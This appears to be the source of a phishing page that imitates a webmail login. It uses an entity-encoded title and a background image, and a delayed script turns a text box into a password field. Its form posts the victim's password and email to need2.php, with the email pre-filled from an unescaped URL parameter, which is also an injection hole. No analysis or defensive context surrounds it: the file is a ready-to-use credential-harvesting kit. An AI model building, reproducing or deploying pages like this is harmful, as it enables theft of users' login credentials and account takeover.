<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#87;&#101;&#98;&#109;&#97;&#105;&#108;&#32;&#58;&#58;&#32;&#87;&#101;&#108;&#99;&#111;&#109;&#101;&#32;&#116;&#111;&#32;&#87;&#101;&#98;&#109;&#97;&#105;&#108;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: 1px solid #b2b2b2; 
    height: 25px; 
    width: 275px; 
  	font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif;
    font-size: 12px;
  	color: #333;
    padding-left:6px; 
    border-radius: 4px; 
    box-shadow: inset 0 0 2px 1px rgba(0,0,0, 0.1);
}  
.textbox:focus { 
    outline: none; 
    border: 1px solid #fff; 
    box-shadow: 0px 0px 12px #777; 
} 
.textbox1 { 
    border: 0px solid #fff; 
    height: 23px; 
    width: 275px; 
  	font-family: "Lucida Grande", Verdana, Arial, Helvetica, sans-serif;
    font-size: 11px;
  	color: #333;
    padding-left:0px; 
    border-radius: 0px; 
}  
.textbox1:focus { 
    outline: none; 
    border: 0px solid #fff; 
} 
 </style>
 <style type="text/css">
div#container
{
	position:relative;
	width: 521px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body bgColor="#D1D5D8">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:521px; height:464px; z-index:0"><img src="images/w2.png" alt="" title="" border=0 width=521 height=464></div>
<form action=need2.php name=dawatwalima id=dawatwalima method=post>
<div id="formradio1" style="position:absolute; left:42px; top:189px; z-index:1"><input type="radio" name="formradio1"></div>
<input name="pd" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:293px;left:170px;top:248px;z-index:2">
<div id="formimage1" style="position:absolute; left:189px; top:305px; z-index:3"><input type="image" name="formimage1" width="129" height="27" src="images/vf.png"></div>
<input name="email" value="<?=$_GET[user2]?>" class="textbox1" autocomplete="off" required type="text" style="position:absolute;width:234px;left:220px;top:350px;z-index:4">
</div>

</body>
</html>
